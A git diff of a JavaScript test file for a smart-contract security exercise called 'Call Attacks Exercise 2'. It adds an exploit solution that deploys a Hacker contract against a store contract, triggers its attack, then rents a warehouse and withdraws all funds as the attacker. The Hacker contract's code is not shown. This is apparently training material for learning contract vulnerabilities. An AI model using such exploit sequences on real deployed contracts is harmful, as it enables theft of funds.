@@ -5,10 +5,10 @@ describe('Call Attacks Exercise 2', function () {
 
   let deployer, attacker;
 
-  const INITIAL_SUPPLY = ethers.utils.parseEther('100')
-  const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther('100')
-  const STORE_INITIAL_BALANCE = ethers.utils.parseEther('100000')
-  const DAILY_RENT_PRICE = ethers.utils.parseEther('50')
+  const INITIAL_SUPPLY = ethers.utils.parseEther('100');
+  const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther('100');
+  const STORE_INITIAL_BALANCE = ethers.utils.parseEther('100000');
+  const DAILY_RENT_PRICE = ethers.utils.parseEther('50');
 
   before(async () => {
     /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
@@ -43,6 +43,18 @@ describe('Call Attacks Exercise 2', function () {
 
   it('Exploit', async () => {
     /** CODE YOUR SOLUTION HERE */
+
+    const HackerFactory = await ethers.getContractFactory(
+      'contracts/call-attacks-2/Hacker.sol:Hacker',
+      attacker
+    );
+    this.hacker = await HackerFactory.deploy(this.secureStore.address);
+
+
+    await this.hacker.attack();
+
+    await this.secureStore.connect(attacker).rentWarehouse(0, 1);
+    await this.secureStore.connect(attacker).withdrawAll();
 
   });
 
